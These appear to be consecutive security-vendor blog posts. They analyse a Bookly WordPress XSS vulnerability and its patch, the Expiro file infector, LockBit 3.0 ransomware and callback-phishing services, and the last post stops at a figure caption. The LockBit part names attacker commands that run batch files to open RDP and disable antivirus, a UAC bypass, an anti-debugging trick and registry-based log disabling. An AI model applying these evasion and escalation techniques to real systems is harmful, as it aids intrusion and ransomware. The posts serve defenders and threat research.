<span class="rt-reading-time" style="display: block;"><span class="rt-label">Estimated reading time: </span><span class="rt-time">3</span><span class="rt-label"> minutes</span></span><p>WordPress is a popular content management system that allows users to create and manage websites with the help of various plugins. One such plugin widely used by over 60,000 websites is the &#8220;WordPress Online Booking and Scheduling Plugin &#8211; Bookly.&#8221; Bookly streamlines online bookings and automates the reservation process. However, like many other WordPress plugins, it, too, can be vulnerable to exploitation by attackers.</p>
<p>In March 2023, Quick Heal Security Labs identified a vulnerability in the Bookly plugin. As soon as we discovered the flaw, we initiated responsible disclosure procedures to ensure that the vulnerability would be addressed promptly. On March 3, 2023, we contacted the Bookly plugin support team after discovering the vulnerability earlier that day and provided them with the full technical details. We also notified plugins@wordpress.org and Wordfence (CNA) of the vulnerability. The vulnerability was quickly acknowledged and assigned the CVE-2023-1172 identifier. The Bookly team worked on developing a patch and released it on March 9, 2023, in version 21.5.1.</p>
<p>In this post, we will conduct a thorough analysis of the root cause of the vulnerability found in the Bookly plugin, as well as an examination of the patch that was released to address the issue.<strong> </strong></p>
<p><strong>Analysing CVE</strong><strong>&#8211;</strong><strong>2023-1172 &#8211;</strong> <strong>Unauthenticated Stored Cross-Site Scripting via Name:</strong></p>
<p>Our research revealed that the Bookly plugin&#8217;s &#8220;Full name&#8221; field was vulnerable to stored cross-site scripting (XSS) attacks due to inadequate input sanitization and output escaping. We further investigated and found that the plugin reuses the user&#8217;s &#8220;Full name&#8221; input in multiple files, significantly increasing the risk of security breaches if the input is not properly sanitized and escaped to prevent malicious code injection. The below code snippet demonstrates how the value of the &#8220;Full name&#8221; field is utilized:</p>
<p><img class="alignnone size-full wp-image-5585" src="https://www.seqrite.com/blog/wp-content/uploads/2023/03/code1.jpg" alt="" width="610" height="71" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/03/code1.jpg 610w, https://www.seqrite.com/blog/wp-content/uploads/2023/03/code1-300x35.jpg 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
<p>As shown below, the &#8220;Full name&#8221; field value is stored in the variable $codes.</p>
<p><img class="alignnone size-full wp-image-5586" src="https://www.seqrite.com/blog/wp-content/uploads/2023/03/code2.jpg" alt="" width="604" height="313" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/03/code2.jpg 604w, https://www.seqrite.com/blog/wp-content/uploads/2023/03/code2-300x155.jpg 300w" sizes="(max-width: 604px) 100vw, 604px" /></p>
<p>Subsequently, the variable $codes is utilized in the calendar&#8217;s tooltip.</p>
<p><img class="alignnone size-full wp-image-5587" src="https://www.seqrite.com/blog/wp-content/uploads/2023/03/code3.jpg" alt="" width="599" height="328" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/03/code3.jpg 599w, https://www.seqrite.com/blog/wp-content/uploads/2023/03/code3-300x164.jpg 300w" sizes="(max-width: 599px) 100vw, 599px" /></p>
<p>However, there appears to be a lack of proper sanitization measures when utilizing the $codes variable later in the program.</p>
<p><img class="alignnone size-full wp-image-5588" src="https://www.seqrite.com/blog/wp-content/uploads/2023/03/code4.jpg" alt="" width="603" height="311" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/03/code4.jpg 603w, https://www.seqrite.com/blog/wp-content/uploads/2023/03/code4-300x155.jpg 300w" sizes="(max-width: 603px) 100vw, 603px" /></p>
<p><strong>Resolving the Issue: A Look at the Patch</strong></p>
<p>After examining the patch that resolves the vulnerability, we discovered that the $codes variable is now adequately sanitized to prevent any potential security breaches in the program. Notably, the patch employs PHP&#8217;s &#8220;strip_tags&#8221; function to sanitize the $codes variable and mitigate the attack before it can be used elsewhere in the code.</p>
<p><img class="alignnone size-full wp-image-5589" src="https://www.seqrite.com/blog/wp-content/uploads/2023/03/code_diff_snap5.jpg" alt="" width="1798" height="809" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/03/code_diff_snap5.jpg 1798w, https://www.seqrite.com/blog/wp-content/uploads/2023/03/code_diff_snap5-300x135.jpg 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/03/code_diff_snap5-768x346.jpg 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/03/code_diff_snap5-1024x461.jpg 1024w" sizes="(max-width: 1798px) 100vw, 1798px" /></p>
<p><strong>Conclusion</strong></p>
<p>This post highlighted a vulnerability in the Bookly plugin that could allow unauthenticated attackers to inject malicious scripts, potentially compromising a site owner&#8217;s entire site when they accessed the calendar tooltip from the plugin. Thankfully, the vulnerability has been fully resolved in version 21.5.1. We strongly recommend that WordPress site owners update their site to the latest patched version of the plugin (currently version 21.6 at the time of writing) to prevent potential attacks.</p>

<span class="rt-reading-time" style="display: block;"><span class="rt-label">Estimated reading time: </span><span class="rt-time">6</span><span class="rt-label"> minutes</span></span><p><span style="font-weight: 400;">A recent virus infection faced by some users was swiftly detected as being caused by Expiro. We have conducted an in-depth investigation and analysis of the intricacies of Expiro and what makes it such a potent threat. This article outlines our analysis and understanding of the matter from our Security Research Lab and explains the necessary steps for those impacted.</span></p>
<p><span style="font-weight: 400;">Let&#8217;s begin.</span></p>
<p><b>About Expiro</b></p>
<p><span style="font-weight: 400;">Expiro is a file infector virus that damages and infects application files from users&#8217; systems by appending its virus code to the PE (executable) files.  </span></p>
<p><span style="text-decoration: underline;"><b>Source</b></span></p>
<p><span style="font-weight: 400;">The infection vector for Expiro is observed to be from the following sources:</span></p>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Cracked or patched version of the software</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Drive-by-download: Download of a file after visiting an infected website</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Dropped by some other malware</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">USB drives</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Malvertising campaigns etc.</span></li>
</ul>
<p><span style="font-weight: 400;">Expiro infects both 32-bit and 64-bit executable files. The new variant of Expiro is an &#8220;Appender&#8221; virus that infects files by inserting virus code at the end of the file, precisely, at the end of the last section of the executable file. </span></p>
<p><span style="text-decoration: underline;"><b>Behavioural Analysis:</b></span></p>
<p><span style="font-weight: 400;">Upon execution, Expiro adds the below-mentioned file to the system. The file is encrypted and contains stolen browser certificates and passwords.</span></p>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">%AppData%\&lt;random_hex_values&gt;.bin</span>
<ul>
<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">Eg: %AppData%\60ca123a243237b7.bin</span></li>
</ul>
</li>
</ul>
<p><span style="font-weight: 400;">To make sure only one instance of Expiro is running onto the infected system, the below mutexes are created:</span></p>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">\BaseNameObjects\SM0:&lt;self_pid&gt;:WilStagig_02</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">\BaseNameObjects\Multiarch.m0yv-&lt;random_hex_values&gt;-inf</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">\BaseNameObjects\Multiarch.m0yv-&lt;random_hex_values&gt;b7f3f232-b</span></li>
</ul>
<p><img class=" wp-image-5562 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/02/sq1-300x38.jpg" alt="" width="364" height="46" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/02/sq1-300x38.jpg 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/02/sq1.jpg 549w" sizes="(max-width: 364px) 100vw, 364px" /></p>
<p style="text-align: center;"><i><span style="font-weight: 400;">Fig-1: Mutex added by Expiro</span></i></p>
<p><span style="font-weight: 400;">Expiro then connects with remote servers and receives commands to execute on the infected systems.</span></p>
<p><span style="text-decoration: underline;"><b>File infection process:</b></span></p>
<p><span style="font-weight: 400;">While earlier variants of Expiro were patching a fixed pattern of codes at the start of the entry point, this code can further jump to the last section containing actual virus codes.</span></p>
<p><span style="font-weight: 400;">Therefore, the recent variant of Expiro is patching a call in the executable section that further jumps to the last section at an offset where the malicious virus code is present.</span><br />
<img class=" wp-image-5560 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa2-300x70.png" alt="" width="582" height="136" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa2-300x70.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa2-768x178.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa2.png 797w" sizes="(max-width: 582px) 100vw, 582px" /></p>
<p style="text-align: center;"><i><span style="font-weight: 400;">Fig &#8211; 2: Version of same file before and after Call patchin</span></i><span style="font-weight: 400;">g</span></p>
<p><img class=" wp-image-5561 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa3-300x145.png" alt="" width="627" height="303" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa3-300x145.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa3-330x160.png 330w, https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa3.png 717w" sizes="(max-width: 627px) 100vw, 627px" /></p>
<p style="text-align: center;"><i><span style="font-weight: 400;">Fig-3: Patched call further jumps to last section having virus code</span></i></p>
<p><span style="font-weight: 400;">The code to calculate and select which Call to patch is highly obfuscated. After the Call is decided, it is overwritten by the offset of the virus code. Once the offset is written, it can be challenging to restore the original offset. </span></p>
<p><span style="font-weight: 400;">The appended virus code is kept in an encrypted fashion. The decryption routine for this encrypted code uses a combination of lengthy arithmetic and logical operations, making the decryption complex. </span></p>
<p><img class=" wp-image-5563 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa4-300x184.png" alt="" width="527" height="323" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa4-300x184.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa4.png 687w" sizes="(max-width: 527px) 100vw, 527px" /></p>
<p style="text-align: center;"><i><span style="font-weight: 400;">Fig 4: Part of a routine that decrypts Expiro code</span></i></p>
<p><span style="font-weight: 400;">The code is decrypted at runtime. Decrypted code contains a compressed buffer that decompresses at runtime. This decompressed buffer is again decrypted by implementing ChaCha and custom algorithms. </span></p>
<p><span style="font-weight: 400;">Upon analysing multiple files of this variant, we found that the decompressed buffer for most of the infected files remains the same, and the wrapper keeps changing. After successful decompression and decryption, the infected application is launched, infecting other executables in the system. The infection process is implemented in such a manner that the infected application works just as a normal one would, without the user&#8217;s knowledge of the application being infected.</span></p>
<p>&nbsp;</p>
<p><b>What makes the restoration of files infected by Expiro challenging?</b></p>
<p><span style="font-weight: 400;">Due to the use of obfuscated call patching routine and encrypted virus code data, cleaning infected code with complete accuracy is challenging, leaving the executables at a high risk of instability.</span></p>
<p><span style="font-weight: 400;">After the call is patched, original addresses are encrypted with multiple layers, followed by compression. Decompression and decryption of these addresses happen during runtime in memory. Calculating and restoring these clean addresses is tricky and may result in the corruption of the original file.</span></p>
<p>&nbsp;</p>
<p><b>How Expiro operates</b></p>
<p><span style="font-weight: 400;">Once the system is infected with Expiro, it possesses worm-like capabilities, where it checks for network-mapped drives and infects executable files in mapped network drives. This results in spreading the infection across the network.</span></p>
<p><span style="font-weight: 400;">Expiro connects to remote malicious CNC servers and acts as a backdoor by sending system information and receiving commands from remote servers.</span></p>
<p><span style="font-weight: 400;">Some attackers consciously keep their CnC servers unavailable at most times and bring them up only periodically.</span></p>
<p><b>Risks posed by Expiro </b></p>
<p><span style="font-weight: 400;">Having the ability to communicate with a remote CnC server, Expiro possesses capabilities to accept commands from its controller and execute them on the infected systems.</span></p>
<p><span style="font-weight: 400;">With successful commands delivered to victims, Expiro can:</span></p>
<p><span style="font-weight: 400;">&#8211; Install other malware (like keyloggers, spywares, ransomware etc.) </span></p>
<p><span style="font-weight: 400;">&#8211; Steal and upload sensitive information</span></p>
<p><span style="font-weight: 400;">&#8211; Disable security software from the systems</span></p>
<p><span style="font-weight: 400;">&#8211; Hijack servers</span></p>
<p><span style="font-weight: 400;">&#8211; Establish itself to act at a later point in time</span></p>
<p><b>How to identify if the system or network is infected with Expiro</b></p>
<p><span style="font-weight: 400;">The Expiro Malware family is an &#8220;appender.&#8221; Hence the residual symptoms of Expiro Malware are not unique. If your system is infected with Expiro, you may see common symptoms as following:</span></p>
<ul>
<li aria-level="1"><b>Application crashes</b></li>
</ul>
<p><span style="font-weight: 400;">Customer-installed</span><span style="font-weight: 400;"> applications may crash or exit frequently while you are working on them.  </span></p>
<p><span style="font-weight: 400;">This can be confirmed by looking at the logs captured by the Windows Operating system / Windows Application Event logs.</span><b><br />
</b></p>
<p><img class=" wp-image-5564 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa5-300x212.png" alt="" width="425" height="300" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa5-300x212.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa5.png 438w" sizes="(max-width: 425px) 100vw, 425px" /></p>
<p><b>How to check Windows Application Event Logs?</b></p>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">On the Search bar, type &#8220;Event Viewer&#8221; and select the Event Viewer desktop app.</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">In Event Viewer, expand the Windows Logs folder, and select the Application event log.</span></li>
</ul>
<p>&nbsp;</p>
<ul>
<li aria-level="1"><b>SEQRITE shows detection as below.</b></li>
</ul>
<p><img class=" wp-image-5565 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa6-300x73.png" alt="" width="518" height="126" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa6-300x73.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/02/Sqa6.png 660w" sizes="(max-width: 518px) 100vw, 518px" /></p>
<p><span style="font-weight: 400;">If you are observing any of the above symptoms in your system or within your intra-network, then there is a high possibility that your system or network is infected with Expiro malware. In this case, we strongly recommend you follow these steps: </span></p>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Protect all the machines in the network with <strong><a href="https://www.seqrite.com/" data-wpel-link="internal" target="_self" rel="follow">SEQRITE</a></strong> and make sure the Antivirus is updated with the latest virus definition date.</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">System Scan: Perform a full system scan on all nodes.</span></li>
</ul>
<p><span style="font-weight: 400;"><br />
</span><b>Note</b><span style="font-weight: 400;">: If possible, scan all the Endpoints in an isolated mode – i.e., the system should not be connected to any network.</span></p>
<p><span style="font-weight: 400;"><br />
</span><span style="font-weight: 400;">Once the scanning finishes, you can check the Scan reports.</span></p>
<p><b>Steps to take if your system is infected</b></p>
<p><span style="font-weight: 400;"><br />
</span><b>1) If Personal Application is infected</b> <span style="font-weight: 400;"><br />
</span><span style="font-weight: 400;">If an application is infected, it must be reinstalled from the Application Vendor&#8217;s website or by downloading from a trusted source. You may restore your apps from a backup only after performing a complete scan of the backup and ensuring it&#8217;s clean and safe.</span></p>
<p><b>Note: Please only reinstall applications once they are scanned and confirmed to be clean. Before installing a fresh copy of the application, scan the complete system to ensure that Expiro isn&#8217;t present on the machine; otherwise, the newly downloaded applications and installable may get infected again.</b></p>

</span><b>2) If the Operating system applications are infected</b><span style="font-weight: 400;"><br />
</span><span style="font-weight: 400;">Expiro can infect Operating systems files such as Windows Installer Service [C:\Windows\system32\msiexec.exe] or system drive where Operating system has been installed. Refer the following screen shot: &#8211;</span><span style="font-weight: 400;"><br />

</span></p>
<p><span style="font-weight: 400;">If the OS files are infected, the safest option is to contact your IT admin to rebuild the Operating system.</span></p>
<p><b>Note</b><span style="font-weight: 400;">: The persistence of the Expiro Infection can be traceable via Antivirus Scan reports. You can bifurcate which drive or application is infected by looking at the reports. </span></p>
<p><span style="font-weight: 400;">Before connecting the system to a network, it&#8217;s crucial to validate the system&#8217;s and the network&#8217;s sanity. Connecting a fresh and cleaned system to a network with Expiro infector hidden on any device may again infect this new system.</span></p>

<span class="rt-reading-time" style="display: block;"><span class="rt-label">Estimated reading time: </span><span class="rt-time">6</span><span class="rt-label"> minutes</span></span><p>Since the infamous Conti ransomware group disbanded due to source code leaks during the Russia-Ukraine war, the LockBit group has claimed dominance. The group has adopted new extortion techniques and added a first-of-its-kind bug-bounty program, along with many features, to advance their new leak site. Upon investigation and analysis, we have determined that the new LockBit 3.0 variant has a high infection vector and attack chain exhibiting substantial anti-forensic activity.</p>
<h2>Attack Overview</h2>
<p>LockBit&#8217;s new Black variant showed anti-forensic activities which cleared event logs, killed multiple tasks, and deleted services simultaneously. It obtains initial access to the victim&#8217;s network via SMB brute forcing from various IPs.</p>
<p><img class=" wp-image-5549 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/lockbit3.drawio-1-300x84.png" alt="" width="414" height="116" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/lockbit3.drawio-1-300x84.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/lockbit3.drawio-1.png 754w" sizes="(max-width: 414px) 100vw, 414px" /></p>
<p style="text-align: center"><em><strong>Fig. 1 – Attack Chain</strong></em></p>
<p>The sys-internal tool PSEXEC is used to execute malicious BAT files on a single system which were later cleaned off. These files indicate activity related to modifying RDP &amp; authentication settings while disabling antivirus at the same time:</p>
<ul>
<li>C:\Windows\system32\cmd.exe /c &#8220;&#8221;openrdp.bat&#8221; &#8220;</li>
<li>C:\Windows\system32\cmd.exe /c &#8220;&#8221;mimon.bat&#8221; &#8220;</li>
<li>C:\Windows\system32\cmd.exe /c &#8220;&#8221;auth.bat&#8221; &#8220;</li>
<li>C:\Windows\system32\cmd.exe /c &#8220;&#8221;turnoff.bat&#8221; &#8220;</li>
</ul>
<p>PSEXEC is also used to spread laterally across the victim&#8217;s network to execute the ransomware payload. The encryption is done using a multi-threaded approach where only shared drives got encrypted. The executed payload must have a valid key passed along with the command-line option &#8216;-pass.&#8217; The encrypted files are appended with the <em>.zbzdbs59d</em> extension, which suggests that the builder generates each payload with a random static string.</p>
<h2>Payload Analysis</h2>
<p>The ransomware payload is dropped inside the <em>Windows</em> directory, where every variant requires a unique key to be passed as an argument. This feature was previously known to be used by other ransomware groups like <em>BlackCat</em> and <em>Egregor</em>. Even if the name of the payload is changed from &#8216;Lock.exe&#8217; to anything else or put in any other directory, it does not run. The pass key used in this case is <strong>60c14e91dc3375e4523be5067ed3b111</strong>.</p>
<p>Let us look at a few stages of the payload below:</p>
<h3>Decrypting Sections</h3>
<p><img class=" wp-image-5547 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/decrypt_func_2-300x220.png" alt="" width="633" height="464" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/decrypt_func_2-300x220.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/decrypt_func_2-230x168.png 230w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/decrypt_func_2-768x564.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/decrypt_func_2-150x110.png 150w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/decrypt_func_2.png 809w" sizes="(max-width: 633px) 100vw, 633px" /></p>
<p style="text-align: center"><strong><em>Fig. 2 – Pseudo code for decrypting PE Sections</em></strong></p>
<p>The key passed in the argument is taken from the command line and verified. If it passes verification, this key is further processed to obtain a 1-byte key to decrypt specific sections obtained by traversing the PEB structure. The three sections decrypted in memory are – TEXT, DATA, and PDATA.</p>
<h3>Resolving Obfuscated APIs</h3>
<p>Being packed and having only a few imports, Win32 APIs are resolved by decrypting the obfuscated string with XOR using the key <strong>0x3A013FD5</strong>, which is again unique to each payload.</p>
<p><img class=" wp-image-5546 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/win32api-300x41.png" alt="" width="366" height="50" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/win32api-300x41.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/win32api.png 413w" sizes="(max-width: 366px) 100vw, 366px" /></p>
<p style="text-align: center"><strong><em>Fig. 3 – Resolving APIs</em></strong></p>
<h3>Privilege Escalation</h3>
<p>When Admin privileges are not present during execution, it uses <strong>CMSTPLUA COM</strong> to bypass the UAC prompt, a legitimate Windows Connection Manager Service. This elevates the rights from the user to the administrator level with another instance of the ransomware payload, terminating the current process.</p>
<p><img class=" wp-image-5545 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/cmlua_1-300x92.png" alt="" width="694" height="213" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/cmlua_1-300x92.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/cmlua_1-768x236.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/cmlua_1-1024x315.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/cmlua_1.png 1030w" sizes="(max-width: 694px) 100vw, 694px" /></p>
<p style="text-align: center"><strong><em>Fig. 4 – UAC Bypass using CMSTPLUA</em></strong></p>
<h3>Anti-Debugging Technique</h3>
<p>Threads used for file encryption are hidden from the debugger by calling <strong>NtSetInformationThread</strong> Win32 API via <strong>ThreadInformationClass</strong> with an undocumented value <strong>0x11</strong> that denotes <strong>ThreadHideFromDebugger</strong>. This hinders dynamic analysis by not allowing debug information from the current ransomware&#8217;s thread to reach the attached debugger.</p>
<p><img class=" wp-image-5544 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ntsetinfothread-300x149.png" alt="" width="470" height="234" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ntsetinfothread-300x149.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/ntsetinfothread.png 547w" sizes="(max-width: 470px) 100vw, 470px" /></p>
<p style="text-align: center"><strong><em>Fig. 5 – Anti-Debugging technique to hide threads</em></strong></p>
<h3>Anti-Forensic Activity</h3>
<p>As part of wiping out its traces, lots of anti-forensic activity is observed where Windows Event Logs are disabled by setting multiple registry subkeys to value 0.</p>
<ul>
<li><strong>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\*</strong></li>
</ul>
<p>Specifically, Windows Defender is disabled for evasion. An exhaustive list of <a href="https://sebsauvage.net/paste/?b0443b90f3fc5ffc#UomoaFa+vkJS9tcLpJwcH1X38YjfbBZDDf3BBk1abPE=" data-wpel-link="external" target="_blank" rel="nofollow">Events Cleared</a>.</p>
<h4>Service Deletion and Process Termination</h4>
<p>Process terminated included <em>SecurityHealthSystray.exe</em> and the mutex created during execution was <strong>13fd9a89b0eede26272934728b390e06</strong>. Services were enumerated using a pre-defined list and deleted or killed if found on the machine:</p>

<h3>Ransom Note</h3>
<p>Before encryption, the ransom note is created in every directory except the <em>Program Files</em> and the <em>Windows</em> directory, which aren’t encrypted. We can see that they have moved the naming convention of ransom notes from ‘<em>Restore-My-Files.txt</em>’ to a static string format “<em>zbzdbs59d.README.txt</em>”.</p>
<p><img class=" wp-image-5543 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ransom_note_1-300x147.png" alt="" width="737" height="361" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ransom_note_1-300x147.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/ransom_note_1-768x376.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/ransom_note_1-1024x501.png 1024w" sizes="(max-width: 737px) 100vw, 737px" /></p>
<p style="text-align: center"><strong><em>Fig. 6 – Ransom Note</em></strong></p>
<p>The ransom note contains instructions to install the TOR browser, links for a chat, and the personal ID unique to the victim to communicate with the attackers. It also includes the threat message to leak the stolen data if the ransom amount is not paid and ends with the warnings as usual. Multiple TOR mirrors for their leak site can be seen in the ransom note, which is used to reduce redundancy.</p>
<h3>File Encryption</h3>
<p>Before starting file encryption, a registry key for <em>DefaultIcon</em> is created to associate an icon to all the encrypted files. Along with this ICO file (zbzdbs59d.ico), a BMP file is also dropped in the <strong>C:\ProgramData</strong> directory. Files are encrypted by creating multiple threads where each filename is replaced with a random string generated and appending the extension to them. With full encryption completed under 2 minutes it still has the fastest encryption process since LockBit 2.0.</p>

<p style="text-align: center"><strong><em>Fig. 7 – Encrypted Filenames</em></strong></p>
<h3>Changing Wallpaper</h3>
<p>Finally, the desktop background (different from 2.0 variant) of the victim machine is changed with the <em>systemparametersinfoW</em> win32 API, and displays LockBit Black, and instructions to be followed for decryption.</p>
<p><img class=" wp-image-5369 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2022/10/Lockbit3.0-b.jpg-300x132.png" alt="" width="537" height="236" srcset="https://www.seqrite.com/blog/wp-content/uploads/2022/10/Lockbit3.0-b.jpg-300x132.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2022/10/Lockbit3.0-b.jpg.png 750w" sizes="(max-width: 537px) 100vw, 537px" /></p>
<p style="text-align: center"><strong><em>Fig. 8 – Modified Wallpaper</em></strong></p>
<h2>Conclusion</h2>
<p>Unprotected systems in the network were brute-forced to run the PSEXEC tool for lateral movement across the systems. This was done to execute LockBit’s latest Black ransomware variant. With LockBit 3.0 introducing its bug bounty program and adopting new extortion tactics, it is mandatory to take precautions like downloading applications only from trusted sources, using antivirus for enhanced protection, and avoiding clicking on any links received through email or social media platforms. As threat actors create their own variants from the leaked LockBit Black’s builder, <a href="https://blogs.quickheal.com/proactive-measures-to-safeguard-against-the-ransomware-menace/" data-wpel-link="internal" target="_self" rel="follow">proactive measures</a> must be taken to stay protected.</p>

<span class="rt-reading-time" style="display: block;"><span class="rt-label">Estimated reading time: </span><span class="rt-time">5</span><span class="rt-label"> minutes</span></span><p>Threat actors use multiple methods to distribute malware to infect specific targets. Even though various phishing methods are actively used and evolving, an alternative approach to increase their success rate is to call the target corporate companies. Techniques like <a href="https://www.microsoft.com/en-us/security/blog/2021/07/29/bazacall-phony-call-centers-lead-to-exfiltration-and-ransomware/" data-wpel-link="external" target="_blank" rel="nofollow"><u>BazaCall</u></a> have been observed since 2021. In this technique, a call is made to the target to make them click on malicious links, leading them to install malware unknowingly.</p>
<p>Threat actors like affiliates of ransomware groups have started to utilize this technique to infect targets across the world. They recruit callers who work on phishing campaigns, called the “Callback phishing” technique. With the emergence of such methods, the search for so-called callers is also increasing. Additionally, new callers are making themselves available on the underground forums. The figure below illustrates an advertisement in one of the underground forums wherein the threat actor can be seen posting details of the “job” and inviting callers to join with a promise of revenue-sharing.</p>
<p><img class="wp-image-5525 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/caller_-300x81.png" alt="" width="585" height="158" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/caller_-300x81.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/caller_-768x207.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/caller_.png 955w" sizes="(max-width: 585px) 100vw, 585px" /></p>
<p style="text-align: center"><em><i>Fig. 1 – Threat actor in search of caller services</i></em></p>
<p>As evident from the above advertisement, RAT (Remote Administration Tool) stubs are provided to be installed specifically targeting carriers in the USA and UK.</p>
<h2><strong><b>A Caller’s Perspective</b></strong></h2>
<p>Callers provide their services based on the target and are willing to call as many times as necessary to succeed in their mission. Most services offer English callers as the US and UK are the most targeted locations by cybercrime groups, and they work actively every week. They compel the victims to click on malicious links and install a malicious executable through social engineering and phishing.</p>
<p>Another technique explicitly used by these callers targeting various sectors is called Callback Phishing. They make phone calls through various SIM cards registered to different geographical locations. One such threat actor on telegram has multiple Russian SIM cards offering a higher success rate.</p>
<p><img class=" wp-image-5526 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/Screenshot-2022-12-22-143749-300x24.png" alt="" width="738" height="59" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/Screenshot-2022-12-22-143749-300x24.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/Screenshot-2022-12-22-143749-768x62.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/Screenshot-2022-12-22-143749-1024x83.png 1024w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/Screenshot-2022-12-22-143749.png 1036w" sizes="(max-width: 738px) 100vw, 738px" /></p>
<p style="text-align: center"><em><i>Fig. 2 – Threat actor offering caller services</i></em></p>
<p>Some of these callers don’t send phishing links to individual targets but operate on bulk orders based on the database provided to them. They make these calls from toll-free numbers like 800 or 888 for more credibility rather than using suspicious SIMs that might get blocked. The threat actors demand a premium price, the lowest being a thousand dollars that includes these toll-free numbers and a connection fee. A big chunk of the money goes as salaries to the operators who sit and call for “long and efficient” communication to make the target install the malicious payloads or click the phishing links that redirect to them.</p>
<h2><strong><b>An Affiliate’s Perspective</b></strong></h2>
<p>The threat actors on the forums eagerly seek to hire callers to encrypt the victim’s network. We have observed ransomware affiliates, working with Hive and Quantum, target companies in the manufacturing and legal sectors in the USA and Canada with more than $10M in revenue. Manufacturing being the most attacked sector doesn’t come as a surprise. However, targeting the legal industry is not regular, indicating that threat actors will also pivot their victims based on their financial motives and geopolitical interests.</p>
<p><img class=" wp-image-5527 aligncenter" src="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss3__-300x155.png" alt="" width="499" height="258" srcset="https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss3__-300x155.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/01/ss3__.png 534w" sizes="(max-width: 499px) 100vw, 499px" /></p>
<p style="text-align: center"><em><i>Fig. 3 – Spam Mail to fetch phone details</i></em></p>
